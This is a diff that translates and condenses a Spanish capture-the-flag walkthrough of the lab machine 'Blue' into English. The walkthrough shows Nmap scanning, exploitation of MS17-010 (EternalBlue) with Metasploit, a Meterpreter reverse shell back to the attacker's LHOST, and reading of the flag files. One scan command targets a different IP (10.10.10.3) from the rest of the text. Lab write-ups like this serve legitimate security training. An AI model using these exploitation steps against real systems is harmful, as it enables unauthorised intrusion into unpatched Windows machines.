@@ -1,34 +1,30 @@
 
 # Blue
 
-Creamos los directorio de trabajo con el nombre de la maquina en nuestro caso Lame
+First, we create a working directory named Blue:
 
 ```ruby
 mkdir Blue
 ```
 
-## Reconocimiento de Puertos
+## Port Scanning
 
-Lanzamos un ping para comprobar que tenemos conexión desde nuestra maquina 
+We ping the target to check our connection: 
 
 ```ruby
 ping 10.10.10.40
 ```
 
-Comprobamos la versión del sistema operativo que tenemos si tenemos un ttl de 127 se trata de una maquina windows.
+A TTL of 127 tells us it's a Windows machine.
 
-### Reconocimientos Nmap
+### Nmap Scan
 
-Lanzamos la herramienta Nmap para ver los puertos disponibles que se encuentran abiertos,
-es un escaneo agresivo ya que estamos en un entorno controlado
+We use Nmap to find open ports:
 
 ```ruby
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts
 ```
 
-La salida la ponemos en un archivo con formato grepeable para poder buscar luego 
-
-Los puertos son los siguientes:
 
 ```ruby
 PORT      STATE SERVICE      REASON
@@ -43,7 +39,7 @@ PORT      STATE SERVICE      REASON
 
 ```
 
-Realizamos un escaneo mas exhaustivo para comprobar que versión corre en ese puerto
+We do a more detailed scan:
 
 ```ruby
 nmap --script=firewall-bypass -p135,139,445,49152,49153,49154,49155,49157 -vvv -oN targeted 10.10.10.40
@@ -71,25 +67,25 @@ Host script results:
 
 ```
 
-vemos que podemos explotar la vulnerabilidad eternalblue en la máquina lo podemos de hacer de varias formas yo voy con metasploit que es la forma mas sencilla .
+The scan shows the machine is vulnerable to MS17-010 (EternalBlue).
 
 
-## Explotamos MS17-010
+## Exploiting MS17-010
 
-Para ello primero de todo vamos a metasploit y buscamos aquello referente con el codigo 
+We use Metasploit to exploit this vulnerability:
 
 
 ```ruby
 searchsploit ms17-010
 ```
 
-Encontramos las siguientes vulnerabilidades
+We find:
 
 ``` ruby
    0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14   average  Yes
 ```
 
-Podemos ver que si lo ejecutamos nos lanza una shell meterpreter, por lo tanto vamos a configurarlo para intentar explotar el fallo
+We set up Metasploit:
 
 ```ruby
 msf6 exploit(windows/smb/ms17_010_eternalblue) > setg LHOST 10.10.14.13
@@ -100,7 +96,7 @@ RHOSTS => 10.10.10.40
 ```
 
 
-Explotamos el exploit:
+Then we run the exploit:
 
 ```ruby 
 msf6 exploit(windows/smb/ms17_010_eternalblue) > run
@@ -118,25 +114,23 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 ```
+We get a Meterpreter shell.
 
-Finalmente podemos comprobar que lo explotamos con éxito.
 ```ruby
 meterpreter > ls
 Listing: C:\Windows\system32
 ...
 ```
 
-### Tratamiento de TTY de meterpreter 
+### Improving the Shell
 
-Como no me gusta la terminal de meterpreter porque es un poco precaria voy a tunearla para que sea parecida a la de windows
-
-Para ello vamos a ejecutar el siguiente comando 
+To get a better shell, we run:
 
 ```ruby 
 meterpreter > execute -c -f cmd.exe -H -i -d
 ```
 
-Con esto tenemos una shell como la de windows 
+This gives us a Windows-like shell.
 
 ```ruby 
 Process 1820 created.
@@ -149,23 +143,21 @@ C:\Windows\system32>
 ```
 
 
+#### Finding the Flags
 
-#### Buscamos las flag
-
-Para encontrar las flags vamos al directorio raíz y a partir de ahí realizamos una búsqueda 
-recursiva usamos el siguiente comando.
+To find the flags, we use:
 
 ```ruby
 dir /s /b root.txt user.txt
 ```
-Nos devuelve dos ficheros que existen en el equipo en los siguientes directorios 
+This shows us two files:
 
 ```ruby
 C:\Users\Administrator\Desktop\root.txt
 C:\Users\haris\Desktop\user.txt
 ```
 
-Para ver las flags usamos el siguiente comando (es similar al cat)
+To read a flag, we use:
 
 ```ruby 
 type C:\Users\Administrator\Desktop\root.txt
